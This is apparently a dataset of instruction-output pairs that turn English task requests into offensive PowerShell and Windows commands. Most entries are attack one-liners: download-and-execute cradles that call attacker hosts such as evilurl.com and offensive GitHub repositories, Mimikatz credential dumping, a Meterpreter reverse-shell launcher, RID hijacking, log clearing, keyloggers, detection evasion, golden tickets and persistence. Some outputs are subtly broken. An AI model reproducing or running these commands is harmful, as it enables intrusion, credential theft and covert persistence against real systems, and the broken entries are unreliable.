{"input": "Perform RID Hijacking using the guest account with RID 1001 and specified password.", "output": "Invoke-RIDHijacking -UseGuest -RID 1001 -Password Password1"}
{"input": "Import a PowerShell module and use it to exfiltrate data via DNS.", "output": "Import-Module ${ps_module} ; Invoke-DNSExfiltrator -i ${ps_module} -d ${domain} -p ${password} -doh ${doh} -t ${time} ${encoding}"}
{"input": "Execute a PowerShell script with specific execution policy and hidden window style.", "output": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File malicious.ps1"}
{"input": "Invoke compiled HTML Help (CHM) file with specific storage handler, HH file path, and CHM file path.", "output": "Invoke-ATHCompiledHelp -InfoTechStorageHandler ${infotech_storage_handler} -HHFilePath ${hh_file_path} -CHMFilePath ${chm_file_path}"}
{"input": "Invoke a backdoor through a shortcut (LNK) file and perform cleanup.", "output": "Invoke-BackdoorLNK -LNKPath C:\\Users\\john\\Desktop\\Firefox.lnk -CleanUp"}
{"input": "Clear event logs on the system.", "output": "$logs = Get-EventLog -List | ForEach-Object {$.Log} ; $logs | ForEach-Object {Clear-EventLog -LogName $ } ; Get-EventLog -list"}
{"input": "Execute a command using PsExec, updating a trace session with specified parameters.", "output": "cmd /c \"${ps_exec_location}\" -accepteula -i -s cmd.exe /c logman update trace \"${session}\" --p \"${provider}\" -ets"}
{"input": "Invoke a credential phishing attack.", "output": "Invoke-CredentialPhisher"}
{"input": "Download a file and save it to the temporary directory.", "output": "$x=\"$env:temp\\jxm.exe\";(New-Object System.Net.WebClient).DownloadFile('http://evilurl.com/')"}
{"input": "Create and execute a PowerShell process with a malicious payload encoded in Base64.", "output": "$payload = [System.Text.Encoding]::UTF8.GetBytes(\"<malicious payload>\"); $process = New-Object System.Diagnostics.Process; $process.StartInfo.FileName = \"powershell.exe\"; $process.StartInfo.Arguments = \"-ExecutionPolicy Bypass -NoProfile -EncodedCommand \" + [Convert]::ToBase64String($payload); $process.Start()"}
{"input": "Invoke a PowerShell command on a remote system.", "output": "Invoke-Command -ComputerName <RemoteSystem> -ScriptBlock { <Powershell Command> }"}
{"input": "Invoke PowerShell expression to download and execute a script from a specified URL.", "output": "Invoke-Expression -Command \"IEX(New-Object Net.WebClient).DownloadString('http://hacker.com/bad.ps1')\""}
{"input": "Start recording webcam for a specified duration and save the video to a specified path.", "output": "Start-WebcamRecorder -RecordTime 20 -OutPath 'C:\\webcam.mov'"}
{"input": "Execute a malicious PowerShell command to download and execute a script from a specified URL.", "output": "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://maliciouswebsite.com/maliciousscript.ps1')\""}
{"input": "Import a module, export ADFS certificates, filter files, and display success message.", "output": "Import-Module AADInternals -Force ; Export-AADIntADFSCertificates ; Get-ChildItem | Where-Object {$_ -like \"ADFS*\"} ; Write-Host \"`nCertificates retrieved successfully\""}
{"input": "Execute a hidden PowerShell command with a Base64-encoded payload.", "output": "powershell.exe -nop -w hidden -noni -enc <Base64 Encoded Command>"}
{"input": "Invoke Expression to download and execute an obfuscated PowerShell script from a GitHub repository.", "output": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')"}
{"input": "List files recursively using different aliases of the Get-ChildItem cmdlet.", "output": "ls -recurse ; get-childitem -recurse ; gci -recurse"}
{"input": "Execute a hidden PowerShell command with a script downloaded from a specified website.", "output": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command {iex (New-Object System.Net.WebClient).DownloadString('http://[malicious_website]/malicious_script.ps1')}"}
{"input": "Exploit Jenkins server with specified host and port, running a command to display network statistics.", "output": "Exploit-Jenkins -Rhost 127.0.0.1 -Port 8080 -Cmd 'cmd /c netstat -an'"}
{"input": "Download and execute a script using Invoke-Command with a defined script block.", "output": "$Invoke = {IEX (New-Object Net.WebClient).DownloadString('http://malicious.url/malicious_script.ps1')}; Invoke-Command -ScriptBlock $Invoke"}
{"input": "Invoke a web request to download a potentially unwanted application (PUA) and execute it.", "output": "Invoke-WebRequest ${pua_url} -OutFile ${pua_file} ; & \"${pua_file}\""}
{"input": "Execute Invoke-Mimikatz cmdlet with bypass execution policy.", "output": "powershell -exec bypass -command \"Invoke-Mimikatz -DumpCreds\""}
{"input": "Retrieve information using Get-WmiObject and export the results to a CSV file.", "output": "powershell.exe -c \"Get-WmiObject -class win32_operatingsystem | select -property * | export-csv msdebug.log\""}
{"input": "Download and execute a PowerShell script from a GitHub repository with hidden window style.", "output": "powershell -ep bypass -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');\""}
{"input": "Invoke a PowerShell command on a remote system with a specified hostname.", "output": "Invoke-Command -ComputerName <hostname> -ScriptBlock { < code > }"}
{"input": "Invoke PowerShell expression to download and execute a script from a specified URL.", "output": "Invoke-Expression -Command \"IEX (New-Object Net.WebClient).DownloadString('http://badwebserver.com/SysWin.ps1')\""}
{"input": "Invoke an HTML Application (HTA) with specified file path, script engine, and simulate a user double-click.", "output": "Invoke-ATHHTMLApplication -HTAFilePath ${hta_file_path} -ScriptEngine ${script_engine} -SimulateUserDoubleClick"}
{"input": "Download a file from a specified URL and save it to a local path.", "output": "Invoke-WebRequest -Url http://malicious-server.com/malicious-file.exe -OutFile C:\\malicious-file.exe"}
{"input": "Perform RID Hijacking with a specified user (alice) and RID (500).", "output": "Invoke-RIDHijacking -User alice -RID 500"}
{"input": "Create a PSBypass object and use it to execute Invoke-Mimikatz to dump credentials.", "output": "$Bypass = New-Object System.Management.Automation.PSBypass; $Bypass.AddScript(\"Invoke-Mimikatz -DumpCreds\"); $Bypass.Invoke()"}
{"input": "Download and execute a PowerShell script with hidden window style.", "output": "powershell.exe -nop -w hidden -c \"IEX ((New-Object Net.WebClient).DownloadString('http://evilurl.com/evil.ps1'))\";"}
{"input": "Execute a PowerShell script with bypassed execution policy from a specified file path.", "output": "powershell.exe -ExecutionPolicy Bypass -NoProfile -File \"C:\\Users\\attacker\\script.ps1\""}
{"input": "Invoke-Mimikatz cmdlet with bypassed execution policy.", "output": "powershell -ep bypass -c \"Invoke-Mimikatz\""}
{"input": "Invoke Expression to download and execute an obfuscated PowerShell script from a GitHub repository.", "output": "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')"}
{"input": "Change directory to the temporary folder and execute Kerbrute for Kerberos brute force against a specified domain controller and domain.", "output": "cd $env:temp ; .\\kerbrute.exe bruteforce --dc ${domain_controller} -d ${Domain} $env:temp\\brute_force.txt"}
{"input": "Execute a PowerShell script with bypassed execution policy from a specified file path.", "output": "powershell.exe -ExecutionPolicy Bypass -File sysWin.ps1"}
{"input": "Use NinjaCopy to copy a file from a source path to a local destination.", "output": "Invoke-NinjaCopy -Path 'C:\\windows\\clrt\\clrt.dit' -LocalDestination 'C:\\windows\\temp\\clrt.dit'"}
{"input": "Invoke Mimikatz to dump credentials and execute a Meterpreter payload with specified host and port.", "output": "Invoke-Mimikatz -DumpCreds; Invoke-Shellcode -Payload windows/meterpreter/reverse_tcp -Lhost 192.168.1.1 -Lport 443"}
{"input": "Start a process with nsudo, wait for 5 seconds, and forcefully stop the CMD process.", "output": "Start-Process ${nsudo_path} -Argument \"-U:T -P:E cmd\" ; Start-Sleep -Second 5 ; Stop-Process -Name \"cmd\" -force -erroraction silentlycontinue"}
{"input": "Download and execute a script using Invoke-Command with Invoke-Expression.", "output": "$command = \"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://maliciousurl.com/malicious.ps1')\"; Invoke-Command -ScriptBlock { Invoke-Expression $using:command }"}
{"input": "Invoke PowerShell expression to download and execute a script from a specified URL.", "output": "Invoke-Expression -Command \"IEX (New-Object Net.WebClient).DownloadString('http://badwebserver.com/SysWin.ps1')\""}
{"input": "Execute a PowerShell command with bypassed execution policy and download a script from a specified URL.", "output": "powershell.exe -exec bypass -nop -c \"IEX (New-Object Net.WebClient).DownloadString('https://malicious-website.com/malicious.ps1')\""}
{"input": "Retrieve browser information, including history, for a specified user and search term.", "output": "Get-BrowserInformation -Browser All -Datatype History -UserName Luca -Search 'wikipedia'"}
{"input": "Execute a PowerShell script to turn off Wi-Fi.", "output": ".\\wifi.ps1 -Off"}
{"input": "Execute a PowerShell command with bypassed execution policy and download a script from a specified URL.", "output": "powershell.exe -ep bypass -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://exploitingurl.com/execKern.ps1')\""}
{"input": "Execute a hidden PowerShell command with bypassed execution policy and download a script from a specified URL.", "output": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command {Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious-server.com/malicious-script.ps1')}"}
{"input": "Create a compressed tar archive of a specified Git directory and write the archive path to the console.", "output": "tar -czf ${host.dir.git}.tar.gz -C ${host.dir.git} *; Write-Host ${host.dir.git}.tar.gz; exit 0;"}
{"input": "Retrieve content from a file, get Windows updates, format the table, and display information.", "output": "Get-Content computers.txt | Get-WinUpdates | Format-Table PC,Date,Operation,Status,Title,KB,PC -Wrap -auto"}
{"input": "Execute a hidden PowerShell command with bypassed execution policy and download a script from a GitHub repository.", "output": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')"}
{"input": "Use netsh to set up port forwarding from a specified listen port to a specified connect port and address.", "output": "netsh interface portproxy add v4tov4 listenport=${listen_port} connectport=${connect_port} connectaddress=${connect_address}"}
{"input": "Set environment variables and sleep for 1 second using PowerShell.", "output": "$env:COR_ENABLE_PROFILING = 1 ; $env:COR_PROFILER = '${cls_guid}' ; $env:COR_PROFILER_PATH = '${filename}' ; POWERSHELL -c 'Start-Sleep 1'"}
{"input": "Perform RID Hijacking with specified user, RID, password, and enable the attack.", "output": "Invoke-RIDHijacking -User alice -RID 500 -Password Password1 -Enable"}
{"input": "Retrieve information about Win32 groups using WMI.", "output": "Get-WMIObject Win32_Group"}
{"input": "Get the current date in a specific format.", "output": "Get-Date -UFormat '+%Y-%m-%dT%H:%M:%SZ'"}
{"input": "Execute a Python script with specified filename and IP address as arguments.", "output": "python ${file_name} -i ${IP}"}
{"input": "Execute a PowerShell script with bypassed execution policy from a specified file path.", "output": "powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\User\\somecode.ps1"}
{"input": "Bypass WScript execution policy and execute a PowerShell payload with specified parameters.", "output": "Invoke-WScriptBypass -payload 'powershell.exe -ep Bypass -WindowStyle Hidden -enc <base64>'"}
{"input": "Create a payload with Unicode-encoded Mimikatz command.", "output": "$payload = [System.Text.Encoding]::Unicode.GetBytes(\"Invoke-Mimikatz\")"}
{"input": "Invoke token manipulation to create a new process (cmd.exe) with a specified thread ID.", "output": "Invoke-TokenManipulation -CreateProcess 'cmd.exe' -ThreadId 500"}
{"input": "Execute Inveigh PowerShell script to perform network analysis and attacks on the local network.", "output": "./Inveigh.ps1;Invoke-Inveigh -IP 192.168.1.10"}
{"input": "Execute a Python script with specified filename and host IP address as arguments.", "output": "python ${filename} -i ${host_ip}"}
{"input": "Invoke-Mimikatz cmdlet with bypassed execution policy.", "output": "powershell.exe -exec bypass -c \"Invoke-Mimikatz\""}
{"input": "Start a process with DirLister, wait for 4 seconds, and stop the DirLister process.", "output": "Start-Process ${dirlister_path} ; Start-Sleep -Second 4 ; Stop-Process -Name \"DirLister\""}
{"input": "Start a process with WebBrowserPassView, wait for 4 seconds, and stop the WebBrowserPassView process.", "output": "Start-Process ${webbrowserpassview_path} ; Start-Sleep -Second 4 ; Stop-Process -Name \"WebBrowserPassView\""}
{"input": "Invoke compiled help with specified parameters.", "output": "Invoke-ATHCompiledHelp -ExecuteShortcutCommand -InfoTechStorageHandler ${infotech_storage_handler} -TopicExtension ${topic_extension} -HHFilePath ${hh_file_path} -CHMFilePath ${chm_file_path}"}
{"input": "Create elevated persistence option with WMI, daily execution at 3 PM.", "output": "$ElevatedOptions = New-ElevatedPersistenceOption -PermanentWMI -Daily -At '3 PM'"}
{"input": "Download PowerShell script and execute it using Invoke-Expression.", "output": "$payload = 'IEX (New-Object Net.WebClient).DownloadString(\"http://somesurl.com/juve.ps1\")'; Invoke-Expression $payload"}
{"input": "Retrieve information about Win32_UserAccount using WMI.", "output": "Get-WmiObject -Class Win32_UserAccount"}
{"input": "Invoke Mimikatz to dump credentials and execute shellcode with specified parameters.", "output": "Invoke-Mimikatz -DumpCreds; Invoke-Shellcode -Payload windows/meterpreter/reverse_tcp -Lhost 10.0.0.1 -Lport 443; Invoke-C"}
{"input": "Retrieve indexed items that contain 'Stingray' in the filter, are of kind 'picture', and have keywords 'portfolio'.", "output": "Get-IndexedItem -Filter Contains(*,'Stingray'), kind = 'picture', keywords='portfolio'"}
{"input": "Set preferences for script block logging, error action, and verbose preferences, then invoke an unspecified command.", "output": "$ScriptBlockLoggingPreference='SilentlyContinue'; $ErrorActionPreference='SilentlyContinue'; $VerbosePreference='SilentlyContinue'; Invoke-SomeCmdlet -Parameter1 Value1 -Parameter2 Value2"}
{"input": "Invoke shellcode with specified shellcode bytes.", "output": "Invoke-Shellcode -Shellcode @(0xE9,0x90,0x83)"}
{"input": "Execute PowerShell with specific options and download script from a URL.", "output": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass  IEX (New-Object Net.WebClient).DownloadString('http://site.com/code')"}
{"input": "Invoke HTML application with specified script engine, inline protocol handler, use of Rundll32, and Rundll32 file path.", "output": "Invoke-ATHHTMLApplication -ScriptEngine ${script_engine} -InlineProtocolHandler ${protocol_handler} -UseRundll32 -Rundll32FilePath ${rundll32_file_path}"}
{"input": "Invoke an unspecified command with specified file paths and an XML payload.", "output": "${mwcpath}\\${mwcname} \"${xml_payload}\" output.txt"}
{"input": "Execute PowerShell with specific options and download script from a URL using Invoke-WebRequest.", "output": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command \"IEX (Invoke-WebRequest -Uri 'http://HeavySite.com/script.ps1').Content\""}
{"input": "View network resources on a remote host with the specified fully qualified domain name.", "output": "net view \\\\${remote.host.fqdn} /all"}
{"input": "Set a property in the Windows registry related to Winlogon with the specified values.", "output": "Set-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Shell\" \"explorer.exe, ${binaryToExec}\" -Force"}
{"input": "Invoke command on a specified target computer to download and execute a PowerShell script from a URL.", "output": "Invoke-Command -ComputerName <target> -ScriptBlock { Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil-web.site/superbad.ps1') }"}
{"input": "List the contents of the current directory.", "output": "dir"}
{"input": "Import a certificate from a specified path, move it to the Cert:\\LocalMachine\\Root store, and assign it to the $cert variable.", "output": "$cert = Import-Certificate -FilePath ${pfx_path} -CertStoreLocation Cert:\\LocalMachine\\My ; Move-Item -Path $cert.PSPath -Destination \"Cert:\\LocalMachine\\Root\""}
{"input": "Invoke a method on the Win32_Product class with specified action and arguments.", "output": "Invoke-CimMethod -ClassName Win32_Product -MethodName ${action} -Arguments @{ PackageLocation = '${msi_Payload}' }"}
{"input": "Invoke the execution of MSBuild.", "output": "Invoke-ExecuteMSBuild"}
{"input": "Get the wininit process and perform token manipulation to create a new process for 'cmd.exe'.", "output": "Get-Process wininit | Invoke-TokenManipulation -CreateProcess 'cmd.exe'"}
{"input": "Get info about the current domain", "output": "Get-Domain"}
{"input": "Generate golden ticket using the krbtgt hash of the child domain, the child domain SID and the root domain SID", "output": "ticketer.py -nthash < krbtgt_hash> -domain < child_domain> -domain-sid < child_domain_sid> -extra-sid < root_domain_sid> Administrator"}
{"input": "Perform password spraying attack (assuming that passwords might be re-used elsewhere), Search for string pattern in registry, The following PowerShell command will sift through the selected registry hives (HKCR, HKCU, HKLM, HKU, and HKCC) and recursively search for any chosen pattern within the registry key names or data values. In this case we are searching for the 'password' pattern:", "output": "$pattern = \"password\";$hives = \"HKEY_CLASSES_ROOT\",\"HKEY_CURRENT_USER\",\"HKEY_LOCAL_MACHINE\",\"HKEY_USERS\",\"HKEY_CURRENT_CONFIG\";foreach ($r in $hives) { gci \"registry::${r}\\\" -rec -ea SilentlyContinue | sls \"$pattern\" };foreach ($r in $hives) { gci \"registry::${r}\\\" -rec -ea SilentlyContinue | % { if((gp $_.PsPath -ea SilentlyContinue) -match \"$pattern\") { $_.PsPath; $_ | out-string -stream | sls \"$pattern\" }}}"}
{"input": "Get a PSSession", "output": "Enter-PSSession -ConfigurationName doublehopsess -ComputerName < pc_name> -Credential domain_name\\username"}
{"input": "String Obfuscation, Obfuscates a string (e.g., a command) using Base64 encoding to evade detection by security tools.", "output": "$originalString = 'SensitiveCommand'; $obfuscatedString = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($originalString)); $decodedString = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($obfuscatedString)); InvokeExpression $decodedString"}
{"input": "Here's an example of dumping local password hashes (hashdump) using nishang Get-PassHashes module:", "output": "iex(iwr(\"https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1\"));Get-PassHashes"}
{"input": "Function Renaming for Evasion, Renames a PowerShell function to something less conspicuous, which can help in evading script analysis and monitoring tools.", "output": "Function MyGetProc { Get-Process }; MyGetProc"}
{"input": "Full way impersonating the user, Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC", "output": "Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap"}
{"input": "Try to escalate privileges on an instance", "output": "Invoke-SQLEscalatePriv -Verbose -Instance \"SQLServer1\\Instance1\""}
{"input": "Get GPO of an OU", "output": "Get-NetGPO -GPOName '{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}'"}
{"input": "Capturing Keystrokes, Captures and logs keystrokes to a file, which can be used for gathering sensitive information like passwords.", "output": "$path = 'C:\\temp\\keystrokes.txt'; Add-Type -AssemblyName System.Windows.Forms; $listener = New-Object System.Windows.Forms.Keylogger; [System.Windows.Forms.Application]::Run($listener); $listener.Keys | Out-File -FilePath $path"}
{"input": "PortForwarding Since we have Local Administrator on the intermediate target bizintel: 10.35.8.17, you can add a port forwarding rule to send your requests to the final/third server secdev: 10.35.8.23.  Can quickly use netsh to rip out a one-liner and add the rule.", "output": "netsh interface portproxy add v4tov4 listenport=5446 listenaddress=10.35.8.17 connectport=5985 connectaddress=10.35.8.23"}
{"input": "Find configuration files containing 'password' string, With this command we can locate files containing a certain pattern, e.g. here were are looking for a 'password' pattern in various textual configuration files:", "output": "gci c:\\ -Include *.txt,*.xml,*.config,*.conf,*.cfg,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern \"password\""}
{"input": "Search readable shares", "output": "Find-DomainShare -CheckShareAccess"}
{"input": "Host discovery using mass DNS reverse lookup, Using this command we can perform quick reverse DNS lookup on the 10.10.1.0/24 subnet and see if there are any resolvable (potentially alive) hosts.The results will be then saved in the ip_hostname.txt file in the current working directory.", "output": "$net = \"10.10.1.\";0..255 | foreach {$r=(Resolve-DNSname -ErrorAction SilentlyContinue $net$_ | ft NameHost -HideTableHeaders | Out-String).trim().replace(\"\\s+\",\"\").replace(\"`r\",\"\").replace(\"`n\",\" \"); Write-Output \"$net$_ $r\"} | tee ip_hostname.txt"}
{"input": "Automatic using raiseChild.py This is an Impacket script which will automate escalating from child to parent domain. The script needs:   Target domain controller  Creds for an admin user in the child domain  The flow is:   Obtains the SID for the Enterprise Admins group of the parent domain  Retrieves the hash for the KRBTGT account in the child domain  Creates a Golden Ticket  Logs into the parent domain  Retrieves credentials for the Administrator account in the parent domain  If the `target-exec` switch is specified, it authenticates to the parent domain's Domain Controller via Psexec.", "output": "raiseChild.py -target-exec 10.10.10.10 <child_domain>/username"}
{"input": "Create a guest SMB shared drive, Here's a cool trick to quickly start a SMB (CIFS) network shared drive accessible by anyone:", "output": "new-item \"c:\\users\\public\\share\" -itemtype directory;New-SmbShare -Name \"sharedir\" -Path \"C:\\users\\public\\share\" -FullAccess \"Everyone\",\"Guests\",\"Anonymous Logon\""}
{"input": "Using Alternate Data Streams for Evasion, Hides malicious commands or data in alternate data streams of files, which is a method often used to evade detection.", "output": "$content = 'Invoke-Mimikatz'; $file = 'C:\\temp\\normal.txt'; $stream = 'C:\\temp\\normal.txt:hidden'; SetContent -Path $file -Value 'This is a normal file'; Add-Content -Path $stream -Value $content; GetContent -Path $stream"}
{"input": "Get SID of the current user, The following command will return SID value of the current user, Check if we are running with elevated (admin) privileges:", "output": "([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value"}
{"input": "File Path Obfuscation, Obfuscates a file path using Base64 encoding, making it harder to detect malicious file paths or commands.", "output": "$path = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcVGVtcFxBZG1pblRvb2xz')); Invoke-Item $path"}
{"input": "In-Memory Script Execution, Executes a PowerShell script entirely in memory without writing to disk, helping to evade file-based detection mechanisms.", "output": "$code = [System.IO.File]::ReadAllText('C:\\temp\\script.ps1'); Invoke-Expression $code"}
{"input": "Allow Remote Desktop connections, Disable NLA", "output": "(Get-WmiObject -class \"Win32_TSGeneralSetting\" -Namespace root\\cimv2\\terminalservices -Filter \"TerminalName='RDP-tcp'\").SetUserAuthenticationRequired(0)"}
{"input": "Get info of current forest (no external)", "output": "Get-ForestGlobalCatalog"}
{"input": "Invoke Windows API for Keylogging, This script uses a Windows API call to check the state of each key on the keyboard, effectively logging keystrokes. It can be used to capture user input.", "output": "Add-Type -TypeDefinition @\" using System; using System.Runtime.InteropServices; public class KeyLogger { [DllImport(\"user32.dll\")] public static extern int GetAsyncKeyState(Int32 i); } \"@ while ($true) { Start-Sleep -Milliseconds 100 for ($i = 8; $i -le 190; $i++) { if ([KeyLogger]::GetAsyncKeyState($i) eq -32767) { $Key = [System.Enum]::GetName([System.Windows.Forms.Keys], $i) Write-Host $Key } } }"}
{"input": "Utilizing PowerShell Add-Type for Code Execution, Defines and executes code within a custom .NET class using PowerShell, which can be used to hide malicious activities within seemingly benign code.", "output": "Add-Type -TypeDefinition 'using System; public class MyClass { public static void Run() { Console.WriteLine(\"Executed\"); } }'; [MyClass]::Run()"}
{"input": "This PowerShell command downloads and executes a script from the specified URL (http://10.9.122.8:8080/AZPLhG9txdFhS9n), configuring a web client with system proxy settings and default credentials.", "output": "powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://10.9.122.8:8080/AZPLhG9txdFhS9n');"}
{"input": "Allow Remote Desktop connections, Allow RDP on the firewall", "output": "Get-NetFirewallRule -DisplayGroup \"Remote Desktop\" | Set-NetFirewallRule -Enabled True"}
{"input": "Get DBs, test connections and get info in oneliner", "output": "Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq \"Accessible\" } | Get-SQLServerInfo"}
